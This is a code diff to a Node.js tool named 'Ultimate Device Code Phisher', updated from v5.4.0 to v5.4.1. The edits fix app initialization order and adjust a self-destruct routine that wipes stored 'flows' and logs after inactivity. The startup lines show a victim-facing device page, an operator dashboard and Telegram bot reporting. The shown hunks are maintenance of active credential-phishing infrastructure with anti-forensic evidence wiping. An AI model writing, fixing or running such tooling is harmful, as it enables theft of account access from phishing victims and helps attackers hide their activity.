@@ -1,7 +1,8 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.0 – Crash‑Proof Proxy
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.1 – Order Fix
 // ============================================================
 // Removed Puppeteer, hardened proxy, safe decompression.
+// Fixed 'app' initialization order.
 // ============================================================
 
 const http = require('http');
@@ -329,12 +330,12 @@ function checkSelfDestruct() {
     if (Date.now() - lastActivity > AUTO_WIPE_HOURS * 3600000) {
         console.log('💥 Self-destruct triggered! Wiping all data...');
         db.run('DELETE FROM flows');
-        if (fs.existsSync(LOGS_DIR)) fs.rmSync(LOGS_DIR, { recursive: true, force: true });
+        const logsDir = path.join(__dirname, 'logs');
+        if (fs.existsSync(logsDir)) fs.rmSync(logsDir, { recursive: true, force: true });
         process.exit(0);
     }
 }
 setInterval(checkSelfDestruct, 60000);
-app.use((req, res, next) => { lastActivity = Date.now(); next(); });
 
 // ── SQLite CRUD ──
 async function upsertFlow(flow) {
@@ -433,6 +434,12 @@ const app = express();
 app.use(express.json());
 const staticOpts = { index: false }; // prevent serving index.html automatically
 app.use(express.static('public', staticOpts));
+
+// 🔥 Update lastActivity on every request (must be after app is defined)
+app.use((req, res, next) => {
+    lastActivity = Date.now();
+    next();
+});
 
 app.use((req, res, next) => {
     res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
@@ -999,7 +1006,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.0 – Crash‑Proof Proxy running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.1 – Order Fix running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
